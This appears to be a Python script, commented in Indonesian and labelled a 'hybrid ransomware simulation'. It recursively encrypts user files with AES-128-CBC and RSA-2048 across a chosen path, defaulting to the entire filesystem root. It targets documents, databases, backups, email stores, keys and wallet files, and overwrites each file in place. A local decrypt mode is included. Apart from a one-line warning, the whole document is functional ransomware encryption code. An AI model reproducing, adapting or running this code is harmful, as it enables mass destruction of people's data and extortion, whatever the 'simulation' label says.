import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# ============================================================
# KONFIGURASI
# ============================================================
RSA_KEY_SIZE = 2048
AES_KEY_SIZE = 16  # 128 bit
IV_SIZE = 16       # 16 byte untuk AES-CBC
RSA_ENCRYPTED_SIZE = 256  # hasil enkripsi RSA-2048 + OAEP

# Folder yang dilewati agar tidak merusak sistem (opsional)
SKIP_DIRS = {
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    'System Volume Information', '$Recycle.Bin', 'boot', 'etc', 'proc', 'sys'
}
# File yang selalu dilewati (script dan kunci)
SKIP_FILES = {'Hibrida.py', 'public_key.pem', 'private_key.pem'}

# Ekstensi file yang diincar (ransomware modern biasanya menargetkan ini)
TARGET_EXTENSIONS = {
    # Dokumen
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.odt', '.rtf',
    # Gambar & desain
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai', '.svg',
    # Video & audio
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.mp3', '.wav', '.flac',
    # Arsip & backup
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bak', '.backup', '.iso',
    # Basis data
    '.sql', '.mdb', '.accdb', '.dbf', '.db', '.sqlite',
    # Email
    '.pst', '.ost', '.eml', '.msg',
    # Virtualisasi & sertifikat
    '.vmdk', '.ovf', '.pem', '.key', '.crt', '.p12',
    # Kode sumber
    '.c', '.cpp', '.java', '.py', '.php', '.js', '.cs', '.swift',
    # Teks & konfigurasi
    '.txt', '.csv', '.log', '.conf', '.ini', '.wallet'
}

# File untuk menyimpan daftar file yang dienkripsi (agar dekripsi tepat sasaran)
ENCRYPTED_LOG = "encrypted_files.txt"

# ============================================================
# FUNGSI UTILITAS
# ============================================================

def generate_rsa_keys():
    """Bangkitkan pasangan kunci RSA dan simpan ke file .pem"""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=RSA_KEY_SIZE,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Simpan kunci privat
    with open("private_key.pem", "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

    # Simpan kunci publik
    with open("public_key.pem", "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

    print("[+] Kunci RSA berhasil dibuat: public_key.pem & private_key.pem")


def load_rsa_keys():
    """Muat kunci RSA dari file, buat baru jika belum ada"""
    if not os.path.exists("public_key.pem") or not os.path.exists("private_key.pem"):
        generate_rsa_keys()

    with open("public_key.pem", "rb") as f:
        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

    with open("private_key.pem", "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

    return public_key, private_key


def kumpulkan_file(root_path):
    """
    Telusuri semua direktori di bawah root_path,
    kumpulkan file yang memiliki ekstensi target.
    """
    file_target = []
    for dirpath, dirnames, filenames in os.walk(root_path):
        # Abaikan folder sistem
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]

        for filename in filenames:
            if filename in SKIP_FILES:
                continue
            _, ext = os.path.splitext(filename)
            if ext.lower() not in TARGET_EXTENSIONS:
                continue
            full_path = os.path.join(dirpath, filename)
            file_target.append(full_path)
    return file_target


def enkripsi_file(root_path):
    """Enkripsi semua file target di root_path menggunakan AES-128 + RSA-2048"""
    public_key, _ = load_rsa_keys()
    files = kumpulkan_file(root_path)

    if not files:
        print("[!] Tidak ada file yang memenuhi kriteria target.")
        return

    print(f"[*] Memulai enkripsi {len(files)} file...")

    # Simpan daftar file yang akan dienkripsi untuk keperluan dekripsi nanti
    with open(ENCRYPTED_LOG, "w") as log:
        for full_path in files:
            log.write(full_path + "\n")

    for full_path in files:
        try:
            with open(full_path, "rb") as f:
                plaintext = f.read()
        except Exception:
            continue  # lewati jika file tidak bisa dibaca

        # Bangkitkan kunci AES dan IV acak
        aes_key = os.urandom(AES_KEY_SIZE)
        iv = os.urandom(IV_SIZE)

        # Enkripsi isi file dengan AES-128-CBC + padding PKCS7
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_len = 16 - (len(plaintext) % 16)
        plaintext_padded = plaintext + bytes([pad_len] * pad_len)
        ciphertext = encryptor.update(plaintext_padded) + encryptor.finalize()

        # Bungkus (kunci AES + IV) dengan RSA-2048 OAEP
        data_to_encrypt = aes_key + iv
        encrypted_key_iv = public_key.encrypt(
            data_to_encrypt,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                         algorithm=hashes.SHA256(), label=None)
        )

        # Tulis ulang file: [header RSA 256 byte] + [ciphertext AES]
        with open(full_path, "wb") as f:
            f.write(encrypted_key_iv)
            f.write(ciphertext)

    print(f"[+] Enkripsi selesai. {len(files)} file terkunci. Kunci privat di 'private_key.pem'.")


def dekripsi_file(root_path):
    """Dekripsi file yang sebelumnya dienkripsi, berdasarkan log"""
    if not os.path.exists(ENCRYPTED_LOG):
        print("[!] File log 'encrypted_files.txt' tidak ditemukan. Tidak bisa melanjutkan dekripsi.")
        return

    _, private_key = load_rsa_keys()

    # Baca daftar file yang dienkripsi
    with open(ENCRYPTED_LOG, "r") as log:
        files = [line.strip() for line in log if line.strip()]

    print(f"[*] Memulai dekripsi {len(files)} file...")

    for full_path in files:
        if not os.path.exists(full_path):
            print(f"[-] File tidak ditemukan, lewati: {full_path}")
            continue

        try:
            with open(full_path, "rb") as f:
                encrypted_key_iv = f.read(RSA_ENCRYPTED_SIZE)
                ciphertext = f.read()
        except Exception:
            continue

        # Dekripsi header RSA untuk mendapatkan kunci AES + IV
        try:
            key_iv = private_key.decrypt(
                encrypted_key_iv,
                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                             algorithm=hashes.SHA256(), label=None)
            )
        except Exception:
            print(f"[-] Gagal mendekripsi header, mungkin bukan file kita: {full_path}")
            continue

        aes_key = key_iv[:AES_KEY_SIZE]
        iv = key_iv[AES_KEY_SIZE:]

        # Dekripsi isi file
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        # Hapus padding PKCS7
        pad_len = padded_plaintext[-1]
        if pad_len > 16:
            print(f"[-] Padding tidak valid: {full_path}")
            continue
        plaintext = padded_plaintext[:-pad_len]

        with open(full_path, "wb") as f:
            f.write(plaintext)

    # Hapus log setelah dekripsi berhasil
    os.remove(ENCRYPTED_LOG)
    print(f"[+] Dekripsi selesai. {len(files)} file telah dikembalikan.")


# ============================================================
# PROGRAM UTAMA
# ============================================================

def main():
    print("=== Simulasi Ransomware Hibrida (AES-128 + RSA-2048) ===")
    print("PERINGATAN: Gunakan hanya di lingkungan uji yang aman!\n")

    path = input("Masukkan path target (kosongkan untuk seluruh sistem [tidak disarankan]): ").strip()
    if not path:
        if os.name == 'posix':
            path = '/'
        else:
            path = 'C:\\'
        print(f"[!] Menggunakan root: {path}")

    if not os.path.exists(path):
        print("[!] Path tidak valid.")
        return

    print("\n1. Enkripsi semua file target")
    print("2. Dekripsi file (dari log sebelumnya)")
    pilihan = input("Masukkan pilihan (1/2): ").strip()

    if pilihan == "1":
        enkripsi_file(path)
    elif pilihan == "2":
        dekripsi_file(path)
    else:
        print("[!] Pilihan tidak valid.")


if __name__ == "__main__":
    main()